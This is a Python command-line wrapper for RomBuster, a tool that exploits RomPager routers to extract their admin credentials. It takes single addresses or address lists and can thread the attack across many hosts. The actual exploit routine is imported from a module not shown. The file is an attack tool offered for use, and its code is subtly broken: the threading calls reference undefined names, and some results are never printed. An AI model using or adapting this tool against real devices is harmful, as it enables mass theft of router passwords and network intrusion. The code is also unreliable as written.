#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import argparse
import threading

from .__main__ import RomBuster
from .badges import Badges


class RomBusterCLI(RomBuster, Badges):
    thread_credentials = list()

    description = "RomBuster is a RomPager exploitation tool that allows to disclosure network router admin password."
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('--threads', dest='threads', action='store_true', help='Use threads for fastest work. [best]')
    parser.add_argument('--list', dest='list', help='Addresses list.')
    parser.add_argument('--address', dest='address', help='Address.')
    args = parser.parse_args()

    def hack(self, host):
        self.print_process(f"({host}) - connecting to device...")
        response = self.connect(host)

        if response is not None:
            self.print_process(f"({host}) - accessing device rom...")
            creds = self.exploit(response)

            if creds is not None:
                self.print_process(f"({host}) - extracting credentials...")
                for username in creds.keys():
                    return f"({host}) - {username}:{creds[username]}"
            self.print_error(f"({host}) - rom access denied!")
            return None
        self.print_error(f"({host}) - connection rejected!")
        return None

    def thread(self, number, host):
        self.print_process(f"Initializing thread #{str(number)}...")
        result = self.hack(host)
        thread_credentials.append(result)
        self.print_information(f"Thread #{str(number)} completed.")
        
    def start(self):
        if self.args.list:
            with open(self.args.list, 'r') as f:
                lines = f.read().strip().split('\n')
                line_number = 0
                for line in lines:
                    if not self.args.threads:
                        result = self.hack(line)
                    else:
                        process = threading.Thread(thread, args=[line_number, line])
                        process.start()
                    line_number += 1
                if not self.args.threads:
                    if result:
                        self.print_success(result)
                else:
                    if self.thread_credentials:
                        for credential in self.thread_credentials:
                            self.print_success(credential)
        elif self.args.address:
            self.hack(self.args.address)
        else:
            self.print_error("No list or address specified!")

def main():
    cli = RomBusterCLI()
    cli.start()
